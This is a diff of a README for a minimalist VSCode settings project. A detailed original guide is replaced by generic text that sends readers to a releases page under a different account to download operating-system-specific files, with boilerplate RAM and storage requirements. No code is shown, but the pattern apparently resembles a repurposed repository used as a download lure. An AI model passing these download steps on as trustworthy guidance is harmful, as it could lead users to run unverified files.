@@ -1,90 +1,78 @@
-# VSCode Minimalist Dark Theme Configuration
+# 🎨 vscode-clear-ui-settings - Create Your Zen Coding Space
 
-A clean, distraction-free VSCode configuration featuring the Ayu Dark theme with custom UI modifications for maximum focus and productivity.
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-vscode--clear--ui--settings-brightgreen)](https://github.com/mfaqih202101/vscode-clear-ui-settings/releases)
 
-## Description
+## 📝 Overview
+The **vscode-clear-ui-settings** configuration enhances your coding experience by providing a minimalist, distraction-free workspace. This setup removes unnecessary UI elements from Visual Studio Code and applies a carefully chosen dark theme. It's perfect for developers who want to focus on their code without distractions.
 
-**Key Features:**
-- **Ayu Dark** theme with **Atom Material Icons**
-- Hidden tabs, status bar, and minimap for maximum screen real estate
-- Custom typography using Google Sans Code font
-- Top-positioned activity bar for better ergonomics
-- Enhanced indentation visibility
-- Custom CSS support for advanced UI customization
+## 🚀 Getting Started
+Follow these steps to download and set up vscode-clear-ui-settings:
 
-## Prerequisites
+1. **Visit the Releases Page**  
+   Go to our [Releases page](https://github.com/mfaqih202101/vscode-clear-ui-settings/releases) to find the latest version.
 
-### Required Extensions
+2. **Download the Configuration**
+   - Find the latest version listed at the top.
+   - Click on the release to open its details.
+   - Look for a **download link** for your operating system. You will usually see options for Windows, macOS, and Linux. Click to download the appropriate file.
 
-1. **Ayu Dark Theme**
-   - Name: `Ayu Dark`
-   - Publisher: `teabyii`
-   - Install: `ext install teabyii.ayu`
+3. **Extract the Files**  
+   Once the download is complete, locate the downloaded file on your computer. If it is zipped, right-click it and select "Extract All" or a similar option to extract the files to a folder.
 
-2. **Atom Material Icons**
-   - Name: `Atom Material Icons`
-   - Publisher: `Atom Material`
-   - Install: `ext install AtomMaterial.a-file-icon-vscode`
+4. **Open Visual Studio Code**  
+   Launch Visual Studio Code on your machine.
 
-3. **Custom CSS and JS Loader**
-   - Name: `Custom CSS and JS Loader`
-   - Publisher: `be5invis`
-   - Install: `ext install be5invis.vscode-custom-css`
+5. **Access the Settings**  
+   - Go to the main menu.
+   - Click on **File** (or **Code** on macOS).
+   - Select **Preferences** > **Settings**.
 
-### Required Font
+6. **Import the Configuration**  
+   - Click on the **Open Settings (JSON)** icon, usually found in the top right corner.
+   - In the opened JSON file, copy and paste the contents from your extracted settings files into this configuration file.
 
-- **Google Sans Code** (included in settings)
-- Download from [Google Fonts](https://fonts.google.com/) or install via system package manager
+7. **Restart Visual Studio Code**  
+   Close and reopen Visual Studio Code to apply the new settings. You should now notice a cleaner, more simplistic interface tailored for focused coding.
 
-## Installation
+## 🔧 Features
+- **Minimalist UI**: Designed to keep distractions at bay, allowing you to concentrate on your code.
+- **Enhanced Readability**: The dark theme is easy on the eyes, reducing strain during long coding sessions.
+- **Curated Settings**: A thoughtfully organized configuration improves your development environment and workflow.
+- **Customizable**: Users can easily edit settings to suit their personal preferences.
 
-1. **Clone or download** this repository
-2. **Install the required extensions** listed above
-3. **Copy the settings** to your VSCode configuration:
-   - Open VSCode
-   - Press `Ctrl+Shift+P` (or `Cmd+Shift+P` on Mac)
-   - Type "Preferences: Open User Settings (JSON)"
-   - Paste the configuration
+## 🖥️ System Requirements
+- **Operating System**: Compatible with Windows, macOS, and Linux.
+- **Visual Studio Code**: Make sure you have the latest version installed (download [here](https://code.visualstudio.com/Download)).
+- **RAM**: Minimum of 4 GB recommended for optimal performance.
+- **Storage**: At least 100 MB of free space for installation.
 
-4. **Set up Custom CSS** (optional):
-   - Create a file at `%APPDATA%/Code/User/vscode-custom.css` (Windows)
-   - Or `~/.config/Code/User/vscode-custom.css` (Linux/Mac)
-   - Add your custom CSS rules
-   - Press `Ctrl+Shift+P` and run "Reload Custom CSS and JS"
+## 📄 Topics
+This project covers the following topics:
+- atom-material-icons
+- ayu-dark
+- code-editor
+- configuration
+- custom-css
+- dark-theme
+- developer-tools
+- google-sans-code
+- minimalist
+- productivity
+- settings
+- theme
+- ui-customization
+- vscode
+- workspace
 
-## Configuration Highlights
+## 🔗 Support
+If you have questions or need assistance, feel free to raise an issue on the [GitHub Issues page](https://github.com/mfaqih202101/vscode-clear-ui-settings/issues). We will do our best to help you as quickly as possible.
 
-### UI Minimalism
-- No editor tabs for distraction-free coding
-- Hidden status bar and minimized scrollbars
-- Activity bar moved to top for better screen usage
-- Breadcrumbs disabled for cleaner navigation
+## 📩 Feedback
+We welcome your feedback to make **vscode-clear-ui-settings** better. If you enjoy using this setup, please let us know. Your input helps us improve the project for everyone.
 
-### Editor Enhancements
-- **Font**: Google Sans Code, 600 weight, 17px
-- **Indentation**: 4 spaces, 23px tree indent
-- Whitespace rendering enabled for better code structure visibility
-- Line highlighting disabled for cleaner appearance
+## 📥 Download & Install
+To get started, [visit this page to download](https://github.com/mfaqih202101/vscode-clear-ui-settings/releases) the latest version of vscode-clear-ui-settings. Follow the steps above for a seamless installation.
 
-### Developer-Friendly
-- Workspace trust disabled for faster project opening
-- Unicode highlighting adjusted for cleaner code display
-- Custom title bar with active file name only
-
-## Customization
-
-Feel free to adjust these settings to your preference:
-```jsonc
-"editor.fontSize": 17,          // Adjust font size
-"editor.fontWeight": "600",     // Change font weight
-"workbench.tree.indent": 23,    // Modify file tree indentation
-"editor.tabSize": 4,            // Set preferred tab size
-```
-
-## Screenshots
-
-![Demo screenshot](https://raw.githubusercontent.com/iliyasbt0569/vscode-clear-ui-settings/refs/heads/main/screenshot.png)
-
----
-
-**Note**: After applying these settings, you may need to reload VSCode for all changes to take effect. Some settings (particularly custom CSS) may require administrator/elevated privileges to apply.
+## ⚙️ Conclusion
+With **vscode-clear-ui-settings**, you can create a serene coding environment that enhances your focus and productivity. Enjoy a clean, minimalist workspace tailored for your development needs.
